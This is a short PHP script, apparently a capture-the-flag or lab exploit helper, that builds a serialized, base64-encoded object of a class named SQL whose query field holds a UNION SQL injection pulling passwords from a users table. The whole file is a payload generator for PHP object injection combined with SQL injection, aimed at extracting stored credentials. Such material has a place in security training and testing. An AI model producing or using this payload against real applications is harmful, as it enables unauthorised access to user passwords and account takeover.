<?php

class SQL {
	public $query = '';
	public function __destruct(){
		
	}
}
?>
<?php

$a = new SQL();
$a->query = "Select username from users where id=1 union select password from users";
$b = base64_encode(serialize($a));

echo $b;
echo "\n";
?>
